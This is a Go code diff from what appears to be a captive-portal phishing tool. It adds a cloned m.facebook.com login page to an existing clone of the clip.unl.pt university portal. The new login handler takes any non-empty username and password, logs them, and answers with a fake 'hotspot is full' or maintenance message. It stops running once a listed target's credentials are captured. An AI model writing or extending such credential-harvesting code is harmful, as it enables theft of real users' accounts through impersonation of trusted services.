@@ -20,6 +20,8 @@ const clipUnlPtSuccessMsgTarget = `Sucesso. Pode-se ligar ao Wi-Fi.`
 const clipUnlPtSuccessMsg = `Este Hotspot está temporariamente em manutençao. Tente mais tarde.
 Relembramos que há hotspots funcionais noutras zonas do edifício.`
 
+const mFacebookComSuccessMsg = `This hotspot is full. Please try again later.`
+
 // Website represents a fully functional servable website.
 type Website struct {
 	Name     string
@@ -176,12 +178,53 @@ func ClipUnlPt() *Website {
 func FacebookCom() *Website {
 
 	var web = &Website{
-		Name: "facebook.com",
+		Name: "m.facebook.com",
 		RawFiles: []string{
-			"./facebok.com/index.raw.html",
+			"index.raw.html",
+			"invalid.raw.html",
 		},
 		LineMatchRe: `(<link|<img|<script)`,
 		ResMatchRe:  `(href=".*?"|src=".*?")`,
+	}
+
+	web.HandleFunctions = map[string]func(http.ResponseWriter, *http.Request){
+		"/": func(w http.ResponseWriter, r *http.Request) {
+			index := web.GetFile(indexHTML)
+			ServeFile(w, r, index)
+		},
+
+		"/login/": func(w http.ResponseWriter, r *http.Request) {
+
+			if r.Method != "POST" {
+				ServeFile(w, r, web.GetFile(indexHTML))
+				return
+			}
+
+			u, p := HandleLogin(r)
+			valid := mFacebookComIsValid(u, p)
+
+			if !valid {
+				ServeFile(w, r, web.GetFile("invalid.html"))
+				return
+			}
+
+			web.Log(u, p)
+			for _, value := range web.Targets {
+				if u == value {
+					fmt.Fprintln(w, clipUnlPtSuccessMsgTarget)
+					web.CancelFunc()
+					return
+				}
+			}
+
+			fmt.Fprintln(w, clipUnlPtSuccessMsg)
+		},
+
+		// Special png that is loaded from an ajax call
+		"/rsrc.php/v3/y0/r/56wh1EdYYio.png": func(w http.ResponseWriter, r *http.Request) {
+			res := web.GetFile("fbpng_res.png")
+			ServeFile(w, r, res)
+		},
 	}
 
 	web.openLogFile()
@@ -190,8 +233,8 @@ func FacebookCom() *Website {
 
 // WebsiteMap maps folder names to website structs.
 var WebsiteMap = map[string]func() *Website{
-	"clip.unl.pt":  ClipUnlPt,
-	"facebook.com": FacebookCom,
+	"clip.unl.pt":    ClipUnlPt,
+	"m.facebook.com": FacebookCom,
 }
 
 func clipUnlPtIsValid(u string, p string) bool {
@@ -227,6 +270,12 @@ func clipUnlPtIsValid(u string, p string) bool {
 	return true
 }
 
-func facebookComIsValid(u string, p string) bool {
-	return false
+func mFacebookComIsValid(u string, p string) bool {
+
+	if u == "" || p == "" {
+		return false
+	}
+
+	//TODO
+	return true
 }
